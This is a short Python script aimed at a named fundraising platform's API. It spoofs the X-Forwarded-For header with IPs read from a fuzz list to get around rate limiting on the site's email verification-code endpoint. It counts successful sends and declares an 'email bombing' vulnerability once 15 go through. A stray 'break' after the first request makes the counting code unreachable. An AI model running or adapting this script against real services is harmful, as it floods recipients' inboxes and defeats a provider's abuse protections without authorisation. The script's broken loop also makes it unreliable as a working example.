import json
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def do():
    target_url = "https://gongyi-api.shuidichou.com/"

    mail_list = []
    with open('../fuzz/mail.txt', 'r') as file:
        for line in file:
            # 去除行尾的换行符并添加到列表中
            mail_list.append(line.rstrip('\n'))

    ip_list = []
    with open('../fuzz/ip.txt', 'r') as file:
        for line in file:
            # 去除行尾的换行符并添加到列表中
            ip_list.append(line.rstrip('\n'))
    success_num = 0
    index = 0
    for ip in ip_list:
        headers = {
            "Host": "gongyi-api.shuidichou.com",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Content-Length": "139",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.shuidichou.com",
            "Referer": "https://www.shuidichou.com/",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "X-Forwarded-For": ip,
        }

        # 发送短信
        sms_body = 'email=xxx%40qq.com'
        r = requests.post(url=target_url + "api/pf/manage/account/sendVerifyCode", data=sms_body, headers=headers,
                          timeout=20, verify=False)
        print(r.text)
        break
        index = index + 1
        if '"code":0' in r.text:
            success_num = success_num + 1

        if success_num >= 15:
            print("测试成功发送15条信息，存在邮箱轰炸漏洞！")
            break


if __name__ == "__main__":
    do()
